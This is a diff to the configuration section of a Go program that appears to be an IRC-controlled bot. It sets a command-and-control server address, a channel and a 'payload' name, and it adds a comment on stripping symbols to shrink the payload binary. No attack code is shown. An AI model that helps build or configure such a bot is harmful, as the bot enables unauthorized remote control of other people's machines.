@@ -12,15 +12,26 @@ import (
 	"bot/tools"
 )
 
+/*
+	Tip for The one that never use golang or didn't about this before.
+	This command will strip The symbol table, That mean it will make our executable file smaller.
+
+	go build -lpflags "-s -w" -o <your payload name> main.go
+
+	Readmore here:
+		https://pkg.go.dev/cmd/link
+		https://stackoverflow.com/questions/28576173/reason-for-huge-size-of-compiled-executable-of-go
+*/
+
 ////////////////////////////////////////////////////////////////////////////
 //                         START CONFIG HERE!!!                          //
 //////////////////////////////////////////////////////////////////////////
 
 const (
-	IRC_Server        = "" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
-	IRC_Channel       = "" //config channel here //should have space!!! //"#Example "
-	IRC_Chan_Password = "" //config channel password here.
-	Payload_Name      = "" //config payload name
+	IRC_Server        = "192.168.1.4:6667" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
+	IRC_Channel       = "#Test "           //config channel here //should have space!!! //"#Example "
+	IRC_Chan_Password = ""                 //config channel password here.
+	Payload_Name      = "payload"          //config payload name
 )
 
 //////////////////////////////////////////////////////////////////////////
